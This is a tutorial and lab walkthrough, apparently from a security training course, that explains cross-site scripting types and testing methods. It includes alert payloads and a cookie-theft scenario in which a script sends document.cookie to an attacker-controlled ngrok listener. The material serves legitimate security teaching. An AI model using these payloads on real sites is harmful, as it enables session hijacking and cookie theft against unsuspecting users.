# Understanding and Testing XSS Vulnerabilities

## What is XSS? (Present in the “Enter Text” Field)

**Cross-Site Scripting (XSS)** is a type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts (usually JavaScript) into webpages viewed by other users. This can lead to:

- Stealing session cookies
- Defacing websites
- Redirecting users to malicious sites

XSS vulnerabilities occur when an application includes untrusted data in its output without proper validation or escaping.

---

## How to Test for XSS in an Application

### 1. Input Fields and Forms Testing

- **Reflective XSS**:  
  Test input fields by entering common XSS payloads, such as:

  ```html
  <script>alert('XSS')</script>


Check if the input is reflected in the HTML output without proper encoding.

* **Stored XSS**:
  In applications where user input is stored (like databases) and then displayed, test whether stored data is properly sanitized.

* **DOM-Based XSS (Type-0 XSS)**:
  A payload is executed as a result of modifying the DOM environment in the victim’s browser. The client-side script runs in an unexpected way.

* **Blind XSS**:
  A type of stored XSS where the execution and impact are not immediately visible to the attacker.

---

### 2. API Responses Testing

If your backend (Node.js, PHP, Python, etc.) sends data to a frontend (React.js, HTML, etc.), ensure:

* API responses are properly encoded and sanitized
* Test by sending crafted payloads in API requests to check for script execution on rendering

---

### 3. URL Parameters Testing

* Inject scripts into URL query parameters
* Observe whether they are executed in the context of the webpage

Example:

```
http://example.com/page?input=<script>alert(1)</script>
```

---

### 4. Third-Party Libraries

* Use safe libraries that sanitize and encode data properly
* Regularly update dependencies to avoid known vulnerabilities

---

## Lab: Reflected XSS

**URL:**
[http://challenges.defhawk.com:8070/vulnerable-xss](http://challenges.defhawk.com:8070/vulnerable-xss)

---

### Scenario 1: Popping an Alert

* **Payload:**

  ```html
  <script>alert(1);</script>
  ```

* **Steps:**

  1. Visit the lab URL
  2. Enter the above payload in the **“Enter Text”** field
  3. Click **Submit**
  4. Observe the popup alert
     
     <img width="884" alt="image" src="https://github.com/user-attachments/assets/e7ed13df-7474-4a78-abd0-acc3b039aa26" />
     <img width="883" alt="image" src="https://github.com/user-attachments/assets/0faccd48-42fe-4f7d-be00-3f085d546579" />


---

### Scenario 2: Steal Cookies Using Callback Listener

1. **Go to your Kali VM**

2. **Install Ngrok**

   * [https://ngrok.com/downloads/linux](https://ngrok.com/downloads/linux)

3. **Run a Simple HTTP Server:**

   ```bash
   python3 -m http.server 8080
   ```

4. **Expose It Using Ngrok:**

   ```bash
   ngrok http 8080
   ```

5. **Copy the Forwarding URL**
   You will see something like:

   ```
   Forwarding https://xyz123.ngrok.io -> http://localhost:8080
   ```

   Save the URL: `https://xyz123.ngrok.io`

6. **Create a Cookie in Your Browser:**

   * Open Developer Tools → Application Tab
   * Under **Cookies**, expand `challenges.defhawk.com`
   * Right-click → **Add Cookie**

     * Name: `test`
     * Value: `sensitive_cookie`
<img width="884" alt="image" src="https://github.com/user-attachments/assets/c027308a-ea85-494a-85f9-f7feda95333c" />

7. **Use the Payload:**

   ```html
   Nice site! <script> window.open("https://xyz123.ngrok.io?" + document.cookie) </script>
   ```

8. **Submit the Payload on the Lab Page**

9. **Observe the Cookie Leak:**
   The cookie should appear in your HTTP listener (Kali terminal), showing it has been sent to your ngrok URL.


